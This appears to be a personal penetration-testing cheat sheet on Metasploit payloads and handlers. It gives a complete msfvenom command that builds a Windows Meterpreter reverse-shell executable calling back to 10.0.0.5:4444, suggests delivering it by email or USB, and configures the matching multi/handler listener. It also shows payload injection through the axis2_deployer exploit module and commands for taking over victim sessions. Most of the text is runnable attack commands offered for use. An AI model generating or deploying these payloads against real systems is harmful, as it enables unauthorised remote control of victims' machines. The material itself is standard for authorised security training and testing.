---
tags: [ "metasploit", "msfvenom", "payloads", "reverse-shell", "handlers" ]
aliases: [ "Multi Handler", "Payload Creation" ]
created: 2025-12-21
---

# 💣 Payload Handlers & Generation

> [!info] Concept
> * **Handler:** The "catcher." It listens on your IP/Port for the incoming connection from the victim.
> * **Payload:** The malicious code running on the victim that calls back to you.

## 1. Manual Delivery (Executable)
Used when you need to manually send a file (e.g., via email or USB) to the target.

**Step A: Generate the Payload (Terminal)**
Create the `.exe` file using `msfvenom`.

- Syntax: msfvenom -p <payload> LHOST=<IP> LPORT=<Port> -f <format> -o <output>
- Run as a background job (-j) so you can keep working

```bash title:MSFVenom_Generate
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe

```

**Start the Listener (Metasploit)** Configure the handler to catch the connection when the user clicks the `.exe`.

```bash title:MSFVenom_Generate

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444

exploit -j
```

## Exploit Delivery (Automatic)

- Example: Axis2 Deployer Exploit
- Set the payload to injected
- Launch

Used when exploiting a vulnerability (like a software bug) to inject the payload automatically.

```bash title:MSFVenom_Generate

use exploit/multi/http/axis2_deployer

set PAYLOAD windows/meterpreter/reverse_tcp_allports
set LHOST <your_ip>
set LPORT 4444

exploit
```

## 3. Session & Job Management

Managing connections when running in the background.

- List running listeners (jobs)
- List active victim connections
- Interact with a specific session (e.g., ID 1)

```bash title:MSFVenom_Generate
jobs

sessions

sessions -i 1
```
